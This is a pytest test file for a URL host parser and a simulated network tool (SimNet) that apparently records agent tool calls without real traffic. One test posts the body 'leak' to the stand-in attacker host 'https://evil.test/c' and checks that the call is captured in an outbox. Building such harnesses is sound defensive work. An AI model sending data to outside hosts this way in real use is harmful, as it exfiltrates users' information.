from __future__ import annotations

import pytest

from hopscope.tools.base import ToolCall, ToolError
from hopscope.tools.net import SimNet, url_host


@pytest.mark.parametrize(
    ("url", "host"),
    [("https://Docs.Example.com/x", "docs.example.com"), ("http://u@evil.test:8080/p", "evil.test")],
)
def test_url_host(url: str, host: str) -> None:
    assert url_host(url) == host


@pytest.mark.parametrize("url", ["ftp://x.test/", "https:///nohost", "http://[::1", "x.test"])
def test_url_host_rejects(url: str) -> None:
    with pytest.raises(ToolError):
        url_host(url)


def test_fetch_and_post_are_simulated() -> None:
    n = SimNet({"https://docs.example.com/task": "do X"})
    assert n.execute(ToolCall("net", "fetch", {"url": "https://docs.example.com/task"})) == {"status": 200, "body": "do X"}
    assert n.execute(ToolCall("net", "fetch", {"url": "https://other.test/"}))["status"] == 404
    n.execute(ToolCall("net", "post", {"url": "https://evil.test/c", "body": "leak"}))
    assert n.outbox == [("https://evil.test/c", "leak")]
